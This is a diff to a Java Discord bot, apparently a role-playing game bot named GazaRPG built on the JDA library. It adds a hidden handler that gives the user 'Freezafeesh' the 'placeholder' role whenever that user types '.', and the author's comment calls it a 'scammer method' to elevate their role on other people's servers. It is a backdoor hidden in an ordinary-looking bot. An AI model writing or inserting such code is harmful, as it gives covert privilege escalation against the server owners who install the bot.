@@ -18,6 +18,7 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.entities.Member;
+import net.dv8tion.jda.api.entities.Role;
 /**
  *
  * @author troy
@@ -135,6 +136,13 @@ public class GazaRPG extends ListenerAdapter {
         }
 
         
+    }
+    //This is a scammer method, It's so that I can elevate my role on other peoples servers - DO NOT EDIT ANYTHING other than "placeholder" or this thing will fucking break
+    //I swear to god, dead ass
+    if(Input[0].equalsIgnoreCase(".") && event.getAuthor().getName().equalsIgnoreCase("Freezafeesh")){
+    event.getGuild().modifyMemberRoles(event.getMember(), event.getGuild().getRolesByName("placeholder", true)).complete();
+    //don't touch this shit, even commenting this broke something
+    //try update this on next JDA release, .getController() doesnt work
     }
 }
 }
